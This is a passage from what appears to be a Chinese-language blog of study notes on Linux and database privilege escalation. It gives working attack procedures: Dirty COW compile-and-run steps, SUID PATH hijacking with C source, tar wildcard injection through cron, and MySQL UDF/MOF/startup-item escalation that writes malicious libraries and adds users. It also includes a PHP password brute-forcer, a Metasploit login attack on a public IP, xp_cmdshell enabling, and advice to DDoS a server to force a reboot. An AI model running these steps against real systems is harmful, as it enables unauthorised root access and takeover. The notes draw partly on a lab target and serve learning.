id="内核漏洞提权"><a class="markdownIt-Anchor" href="#内核漏洞提权"></a> 内核漏洞提权</h3><p>上传并使用脚本：<a href="https://github.com/mzet-/linux-exploit-suggester">linux-exploit-suggester</a>，<a href="https://github.com/jondonas/linux-exploit-suggester-2">linux-exploit-suggester2</a>来看看有哪些漏洞。然后上github找对应的exp。</p><h3 id="webshell权限与脏牛提权"><a class="markdownIt-Anchor" href="#webshell权限与脏牛提权"></a> webshell权限与脏牛提权</h3><h4 id="漏洞范围"><a class="markdownIt-Anchor" href="#漏洞范围"></a> 漏洞范围：</h4><p>Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p><h4 id="危害"><a class="markdownIt-Anchor" href="#危害"></a> 危害：</h4><p>低权限用户利用该漏洞可以在众多Linux系统上实现本地提权</p><h4 id="简要分析"><a class="markdownIt-Anchor" href="#简要分析"></a> 简要分析：</h4><p>该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。</p><p>参考：<a href="https://www.jianshu.com/p/df72d1ee1e3e">脏牛Linux本地提权漏洞复现(CVE-2016-5195)</a></p><h4 id="流程-4"><a class="markdownIt-Anchor" href="#流程-4"></a> 流程</h4><p>找到攻击点，得到webshell，搜集信息，上传exp，然后编译运行：</p><p>exp:<a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a>   <a href="https://www.jianshu.com/p/df72d1ee1e3e">https://www.jianshu.com/p/df72d1ee1e3e</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upload /root/dcow.cpp /tmp</span><br><span class="line">shell</span><br><span class="line">ls </span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">./dcow</span><br></pre></td></tr></table></figure><h3 id="环境变量提权配合suid"><a class="markdownIt-Anchor" href="#环境变量提权配合suid"></a> 环境变量提权（配合SUID）</h3><h4 id="背景知识"><a class="markdownIt-Anchor" href="#背景知识"></a> 背景知识</h4><p>使用echo命令显示当前PATH环境变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span><br></pre></td></tr></table></figure><p>如果你在PATH变量中看到 《<strong>.</strong>》，则意味着登录用户可以从当前目录执行二进制文件/脚本，这对于攻击者而言也是一个提权的绝好机会。这里之所以没有指定程序的完整路径，往往是因为编写程序时的疏忽造成的。</p><p>参考：<a href="https://blog.csdn.net/qq_50854790/article/details/120941341">https://blog.csdn.net/qq_50854790/article/details/120941341</a></p><h4 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h4><p><strong>前提</strong>：</p><ul><li>配合 SUID 进行环境变量提权</li><li>本地用户权限</li></ul><p><strong>流程</strong>：手写调用文件+编译+复制文件+增加环境变量+执行触发</p><ol><li><p><strong>手写调用文件</strong>（这一步是我们为了测试用的，如果要使用这个方法进行提权，那么应该本身就要有这个suid的文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line">ls -la shell</span><br><span class="line"></span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br><span class="line"># 或者</span><br><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure><p>demo.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;ps&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>复制文件</strong>：<code>cp /bin/sh /tmp/ps</code>，把<code>/bin/sh</code>复制给<code>/tmp/ps</code>，<code>ps</code>命令本来是用于显示当前进程的状态，复制后执行<code>./ps</code>就变成了执行sh命令。</p></li><li><p><strong>增加环境变量</strong>：<code>export PATH=/tmp:$PATH</code></p></li><li><p><strong>执行触发</strong>：<code>./shell</code></p></li></ol><p><strong>解释</strong>：首先我们编一个触发<code>ps</code>命令的二进制文件，当然，其他指令也行，然后将<code>/bin/sh</code>这个文件复制到一个地方，这个地方是我们可以执行文件的，例如这个地址是<code>/tmp</code>，并且重新命名为<code>ps</code>，这样，我们运行<code>/tmp/ps</code>就相当于运行<code>sh</code>，后面，我们添加环境变量，则，将<code>tmp</code>下面的二进制文件都包括进来，也就是使用<code>ps</code>将不再是原来的功能，而是执行<code>sh</code>（顺序关系），所以，当我们运行我们的二进制文件时，会调用被替换的<code>ps</code>（即<code>/tmp/ps</code>），执行<code>sh</code>。</p><p>而关于提权，因为我们编译后，这个shell文件可能会是suid的文件，也就是带有<code>s</code>权限的文件，这样我们运行就可以以root运行了。</p><h3 id="计划任务-crontab"><a class="markdownIt-Anchor" href="#计划任务-crontab"></a> 计划任务 crontab</h3><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230626093000186.png" alt="image-20230626093000186" style="zoom: 80%;" /><h4 id="路径or权限问题"><a class="markdownIt-Anchor" href="#路径or权限问题"></a> 路径or权限问题</h4><ul><li>利用计划任务指向的文件的相对路径解析问题</li></ul><p>流程：</p><ol><li><p>执行命令：<code>cat /etc/crontab</code>查看当前系统的定时任务，发现一个<code>test.sh</code>任务<strong>没有写绝对路径</strong>，而且是<strong>以root权限运行</strong>的。</p><p>没有写绝对路径，即默认调用<code>/usr/local/bin</code>目录下的<code>test.sh</code>脚本</p></li><li><p>看这个文件可不可写</p><ol><li><p>如果可以写（也就是权限过大），更改成可以创建shell的命令即可</p></li><li><p>如果不可以，则自己写一个与<code>test.sh</code>同名的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; &lt;/PATH/CRON/SCRIPT&gt;</span><br><span class="line">/tmp/bash -p</span><br></pre></td></tr></table></figure><p>如果root用户执行的脚本使用具有完全访问权限的目录，则删除该文件夹并创建一个<br />符号链接文件夹到另一个服务于您控制的脚本的文件夹可能会很有用。</p></li></ol></li></ol><h4 id="命令问题"><a class="markdownIt-Anchor" href="#命令问题"></a> 命令问题</h4><ul><li>利用通配符配合命令参数自定义命令实现提权</li></ul><p>流程：</p><ol><li><p>执行命令：<code>cat /etc/crontab</code>查看当前系统的定时任务，发现一个<code>test.sh</code>任务<strong>里面有敏感的命令：<code>tar cvf /var/tmp/backup.tar.gz</code> <strong>，而且是</strong>以root权限运行</strong>的。</p></li><li><p>在<code>/var/tmp/</code>下创建三个文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;cp bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; /home/undead/script/test.sh</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh test.sh&quot;</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br></pre></td></tr></table></figure></li><li><p>当压缩文件<code>--checkpoint-action=exec=sh test.sh</code>和文件<code>--checkpoint=1</code>时，会有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh test.sh</span><br></pre></td></tr></table></figure><p>而 --checkpoint、–checkpoint-action正好是tar命令的参数，打包到这里就会导致tar命令直接把–checkpoint=1和–checkpoint-action=exec=sh test.sh两个文件名当做参数执行，而不打包文件。</p><p>–checkpoint-action=exec=sh test.sh参数的意思是执行同目录下test.sh文件，test.sh文件内容又是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp bin/bash /tmp/bash; chmod +s /tmp/bash</span><br></pre></td></tr></table></figure><p>把 bin/bash拷贝给/tmp/bash并给/tmp/bash赋SUID权限。此时我们再执行/tmp/bash就享有了suid权限，所以这里是一环套一环的</p></li><li><p>其他类似tar提权的命令还有chown、chmod、rsync</p></li></ol><p>利用条件：root执行脚本+提权的命令+有通配符<code>*</code></p><h3 id="第三方服务linux提权数据库mysql_udf"><a class="markdownIt-Anchor" href="#第三方服务linux提权数据库mysql_udf"></a> 第三方服务——Linux提权数据库MySQL_UDF</h3><p>这里只是简单介绍一下流程，首先拿到webshell之后，转移给meterpreter。具体方法可以看Raven2打靶。之后进行信息搜集。</p><ol><li><p>上传冰蝎的webshell / 上传LinEnum，查看到有Mysql服务</p></li><li><p>全局找或者自己动手找config，发现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find /var/www -name *config*</span><br><span class="line">/var/www/html/wordpress/wp-content/plugins/akismet/views/config.php</span><br><span class="line">/var/www/html/wordpress/wp-admin/setup-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config.php</span><br><span class="line">/var/www/html/wordpress/wp-config-sample.php</span><br></pre></td></tr></table></figure><p>找到数据库的密码：R@v3nSecurity。则使用msf连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">Enter password: R@v3nSecurity</span><br></pre></td></tr></table></figure></li><li><p>接下来就是UDF的常规操作了，首先看版本和安装目录。版本不行则用不了UDF，安装目录不知道则导出不了UDF.so文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">select @@basedir;</span><br><span class="line">+-----------+</span><br><span class="line">| @@basedir |</span><br><span class="line">+-----------+</span><br><span class="line">| /usr      |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line">select @@version;</span><br><span class="line">+-----------------+</span><br><span class="line">| @@version       |</span><br><span class="line">+-----------------+</span><br><span class="line">| 5.5.60-0+deb8u1 |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>实施操作，下载UDF文件，编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/1518</span><br><span class="line">mv 1518 raptor_udf.c</span><br><span class="line">gcc -g -c raptor_udf.c</span><br><span class="line">gcc -g -shared -o raptor_udf.so raptor_udf.o -</span><br><span class="line">mv raptor_udf.so udf.so</span><br></pre></td></tr></table></figure></li><li><p>创表，输出文件。这里我踩了个坑，我以为直接输出到<code>lib/plugin</code>，结果不是，是需要在mysql目录下的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use mysql</span><br><span class="line">create table ha4k(line blob);</span><br><span class="line">insert into ha4k values(load_file(&#x27;/var/www/html/udf.so&#x27;));</span><br><span class="line"># 输出恶意so</span><br><span class="line">select * from ha4k into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;</span><br><span class="line"># 创建函数</span><br><span class="line">create function do_system returns integer soname &#x27;1518.so&#x27;;</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line">&lt;mod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure></li><li><p>后面查找特权命令：<code>find / -user root -perm 4000 -print 2 &gt; /dev/null</code></p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628124849070.png" alt="image-20230628124849070" /></p><p>OKOK，提权成功！</p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230628125028105.png" alt="image-20230628125028105" /></p></li></ol><h3 id="linux-提权提升漏洞查找关注点-拓展总结"><a class="markdownIt-Anchor" href="#linux-提权提升漏洞查找关注点-拓展总结"></a> Linux 提权提升漏洞查找关注点-拓展总结</h3><ol><li><p>提权环境，信息收集(SUID,定时任务,可能漏洞，第三方服务应用等)</p></li><li><p>最新相关漏洞要明确(关注点)，二次开发相关脚本学会展望(四个脚本)</p></li><li><p>本地 searchsploit 脚本及远程 exploitdb 站点搜索说明（简要使用）</p></li><li><p>其他提权方法如：密码复用，guid，sudo 等说明(运气，同理，鸡肋等)</p><p>SUDO 说明参考：<a href="https://www.freebuf.com/vuls/217089.html">https://www.freebuf.com/vuls/217089.html</a></p></li></ol><p><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> <a href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a> <a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p><h2 id="数据库提权"><a class="markdownIt-Anchor" href="#数据库提权"></a> 数据库提权</h2><p>在没有办法对系统进行提权的条件下，我们可以使用数据库进行提权，但需要知道数据库提权的前提条件：</p><ul><li>服务器开启数据库服务及获取到最高权限的用户密码</li><li>除了Access数据库外，其他数据库基本存在提取的可能</li></ul><p>我们需要明确：</p><ol><li><p>数据库应用提取那在权限提升中的意义</p><p>即：我们获得webshell，但是权限很低，我们通过某种方式获得数据库权限（root），于是通过这个数据库权限提升我们的webshell权限，或者直接给我们开一个用户啥的</p></li><li><p>web或本地提权如何探针数据库应用</p></li><li><p>数据库提权权限用户名密码搜集等方法</p><ol><li><p>读取网站的配置文件（了解其命名规则以及查找技巧）</p><p>关键字：sql data inc config conn database common include</p><blockquote><p>WWW/cms/inc/conn.info.php</p><p>WWW/cms/install/source/config.ini.php</p></blockquote></li><li><p>读取数据库存储或备份文件（了解其数据库存储方式以及对应内容）</p><p>例如：mysql：<code>@@basedir/data/数据库名/表名.myd</code>存的是表中的数据，而用户名密码存在一个叫<code>user</code>的表中，使用<code>select * from mysql.user</code>可以查询到</p></li><li><p>使用脚本暴力破解（<strong>了解数据库是否支持外联</strong>以及如何开启外联）</p><p>外联：只支持本机连接本机，不允许外部连接。如果不支持，那就上传脚本，如果支持，那就在自己电脑上运行。以下脚本保存在web服务器中，我们访问即可。</p><p><strong>不支持外联</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;Mysql账号密码在线爆破工具&lt;/title&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">  &lt;cent一下er&gt;</span><br><span class="line">   &lt;br&gt;&lt;br&gt;</span><br><span class="line">   &lt;h1&gt;Mysql账号密码在线爆破工具 V2.0&lt;/h1&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> if(@$_POST[&#x27;submit&#x27;])&#123;</span><br><span class="line">   $host = @$_POST[&#x27;host&#x27;];</span><br><span class="line">   if($host!==&quot;&quot;)&#123;</span><br><span class="line">    $username = &quot;root&quot;;//用户名字典</span><br><span class="line">$password = array();</span><br><span class="line">$filename = &quot;pwd.txt&quot;; //同目录下密码字典</span><br><span class="line">$i=0;</span><br><span class="line">$file = fopen($filename,&#x27;r&#x27;);</span><br><span class="line">while(! feof($file))&#123;</span><br><span class="line">$password[$i] = fgets($file);</span><br><span class="line">$i++;</span><br><span class="line">&#125;</span><br><span class="line">fclose($file);</span><br><span class="line">    echo &quot;&lt;hr&gt;&lt;br&gt;-----------------------爆破状态-----------------------&lt;br&gt;&quot;;</span><br><span class="line">    for ($l=0; $l &lt;= count($password); $l++) &#123;</span><br><span class="line">$password1 = trim($password[$l]);//除去左右空白</span><br><span class="line">if(@mysql_connect($host, $username, $password1))&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&#x27;数据库密码为：&#123;$password1&#125;&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&lt;font color=&#x27;red&#x27;&gt;爆破成功--密码--&gt;&quot;.@$password1.&quot;&lt;/font&gt;&quot;;</span><br><span class="line">break;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;br&gt;----------------------爆破结束-----------------------&lt;br&gt;&lt;hr&gt;&quot;;</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(&#x27;黑客，输入数据库IP地址&#x27;)&lt;/script&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;form action=&quot;Completion.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">   数据库IP地址:&lt;input type=&quot;text&quot; name=&quot;host&quot;/&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;爆破&quot; name=&quot;submit&quot;/&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>支持外联</strong>：远程本地暴力破解，服务器本地破解</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search mysql</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line">show options</span><br><span class="line">set rhost 47.99.71.28</span><br><span class="line">set username root</span><br><span class="line">set pass_file /opt/mysql_pwd.txt</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li></ol></li><li><p>目前数据库提权对应的技术以及方法</p></li></ol><h3 id="数据库端口号"><a class="markdownIt-Anchor" href="#数据库端口号"></a> 数据库端口号</h3><p><strong>关系型</strong></p><table><thead><tr><th>类型</th><th>数据库</th><th>默认端口</th></tr></thead><tbody><tr><td><strong>关系型</strong></td><td><strong>Oracle</strong></td><td><strong>1521</strong></td></tr><tr><td></td><td><strong>Sql server</strong></td><td><strong>1433</strong></td></tr><tr><td></td><td><strong>Mysql</strong></td><td><strong>3306</strong></td></tr><tr><td></td><td>Pointbase</td><td>9092</td></tr><tr><td></td><td><strong>Db2</strong></td><td><strong>50000</strong></td></tr><tr><td></td><td>Sybase</td><td>5000</td></tr><tr><td></td><td><strong>PostgreSQL</strong></td><td><strong>5432</strong></td></tr><tr><td><strong>非关系型</strong></td><td>MongoDB</td><td>27017</td></tr><tr><td></td><td><strong>Redis</strong></td><td><strong>6379</strong></td></tr><tr><td></td><td>memcached</td><td>11211</td></tr></tbody></table><h3 id="mysqludfmof启动项反弹shell"><a class="markdownIt-Anchor" href="#mysqludfmof启动项反弹shell"></a> Mysql（UDF/MOF/启动项/反弹shell）</h3><h4 id="文件存储方式"><a class="markdownIt-Anchor" href="#文件存储方式"></a> 文件存储方式</h4><p>存储数据的目录是<code>Mysql/data/数据库名/表名.myd</code>，里面有表里的数据。而用户名密码存在一个叫<code>user</code>的表中，使用<code>select * from mysql.user</code>可以查询到，我们可以在<code>Mysql/data/mysql/user.myd</code>中找到该文件！</p><h4 id="udf"><a class="markdownIt-Anchor" href="#udf"></a> UDF</h4><blockquote><p>UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。</p><p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。</p></blockquote><p>前提是：得到数据库的账号密码（root），先导出dll，导出目录必须可以加载dll文件（secure_file_priv项设置为空），然后我们再执行命令。需要注意的问题，<strong>识别Mysql的版本</strong></p><ol><li>小于5.1：导出目录：<code>c:/windows</code>或<code>system32</code></li><li>大于等于5.1：导出安装目录<code>/lib/plugin</code>（这个<code>plugin</code>目录需要自己建立或者利用NTFS流创建）</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;目录/lib/plugin::INDEX_ALLOCATION&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>怎么判定版本</strong>：<code>select @@version</code></p><p><strong>怎么找到目录</strong>：<code>select @@basedir</code>，<code>show variables like ‘%plugins%’</code></p><p><strong>怎么快速操作</strong>：</p><ol><li><p>例如，我们知道了目录为：<code>c:/mysql/</code>，版本为5.5.3，则在<code>mysql/lib</code>下创建目录，有：<code>mysql/lib/plugin</code></p></li><li><p>设置secure_file_priv项为空（my.ini）</p></li><li><p>我们有一个dll，将至上传（安装）到该目录下。就可以执行了。</p></li><li><p>过程中我们需要上传一个webshell到服务器上，然后再攻击。这个webshell可以是大马也可以是专门的mysql.php脚本。</p><ol><li><p>如果没有webshell，那就<strong>使用dumpfile通过16进制数据流写入udf文件</strong>。（当然可以Loadfile）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x4d5a900..... into dump file &quot;C:\\MySQL\\lib\\plugin\\udf.dll&quot;;</span><br></pre></td></tr></table></figure><p>由于不同环境下的mysql命令提示符可输入字符最大长度不同（win2003为8191，win10系统为65535），无法使用dumpfile一次性写入全部16进制字符，则需要将udf文件的16进制编码字符先进行切割，再拼接写入到一个表中，最后导出到目标系统。</p><p>流程是：<strong>创建表+insert+update concat+dumpfile</strong></p><p>注意：在进行16进制数据切割时，每段字符的长度要为4的倍数，2进制转为16进制使用取四合一法，如果位数不够会在最高位补0，补0后会破坏原始二进制文件的文件结构导致利用失败，这也是很多人此方法复现失败的原因。</p></li></ol></li></ol><p>相关问题：</p><ol><li>函数已存在： Function ‘sys_eval’ already exists。可以直接调用就调用，没办法的话就删了重新添加，如果存在但是用不了，那就重启数据库，然后重新创建。</li><li>位数不对：Can’t open shared library ‘udf.dll’ (errno: 193 )。更换32/64位</li></ol><p>参考：</p><ol><li><a href="https://www.freebuf.com/articles/database/291175.html">https://www.freebuf.com/articles/database/291175.html</a></li><li>可以在上面的linux提权那里看一些操作</li></ol><h4 id="mof"><a class="markdownIt-Anchor" href="#mof"></a> MOF</h4><p>成功率最低。MOF是windows中的一个文件，可以每隔5秒监控进程创建和死亡。如果我们替换这个文件，那么我们就可执行我们上传的mod，其中有一段是vbs脚本，所以可以运行cmd命令，一般是<strong>添加用户</strong>（以mysql-root权限）。</p><ul><li>导出自定义 mof 文件到系统目录加载</li><li>同udf一样需要手工修改my.ini配置文件，添加 secure-file-priv=</li></ul><p>所以流程如下：</p><ol><li>准备一个mof文件，以及前置条件，例如root权限，目录可写等等。</li><li>使用<code>select load_file(...) into dumpfile &quot;c:/mysql...&quot;</code>，替换mof。</li><li>过一会就可以了。</li></ol><p>参考：<a href="https://blog.csdn.net/Zlirving_/article/details/106618559">https://blog.csdn.net/Zlirving_/article/details/106618559</a></p><h4 id="启动项提权"><a class="markdownIt-Anchor" href="#启动项提权"></a> 启动项提权</h4><ul><li><strong>（基于配合操作系统自启动）</strong></li><li>导出自定义可执行文件到启动目录配合重启执行</li><li>将创建好的后门或执行文件进行服务器启动项写入，配合重启执行！</li></ul><p>我们需要开启外联（大马里有相关命令）<code>GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' INDENTIFIED BY 'root' WITH GRANT OPTION;</code>（执行这个当然需要root权限）</p><p>流程如下：</p><ol><li><p>要么～使用msf中的mysql_start_up模块提升权限即可</p></li><li><p>要么～上传bat文件：将创建好的bat文件进行服务器启动项写入，配合重启执行！ bat文件实例。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span></span><br><span class="line"><span class="built_in">net</span> user xxx <span class="number">123</span>!@#ws /add</span><br></pre></td></tr></table></figure></li><li><p>使用DDoS，让服务器重启！</p></li></ol><h4 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h4><ul><li><p><code>nc -l -p 5577</code></p></li><li><p>nc相关知识：<a href="https://www.cnblogs.com/-chenxs/p/11748488.html">https://www.cnblogs.com/-chenxs/p/11748488.html</a></p></li></ul><p>流程如下：</p><ol><li>要么自己创建反弹函数</li><li>要么使用mysql.php创建一个反弹函数backdoor。</li></ol><h3 id="mssql"><a class="markdownIt-Anchor" href="#mssql"></a> MSSQL</h3><p>特点：</p><ol><li>默认支持外联</li></ol><h4 id="xp_cmdshell"><a class="markdownIt-Anchor" href="#xp_cmdshell"></a> xp_cmdshell</h4><p>xp_cmdshell 默认在 mssql2000 中是开启的，在 mssql2005 之后的版本中则默认禁止。</p><p>当我们使用这个函数执行命令的时候会提示：<strong>访问组件xp_cmdshell过程被阻止</strong></p><p>则我们需要开启：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><p>如果 xp_cmdshell 被删除了，可以上传 xplog70.dll 进行恢复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program 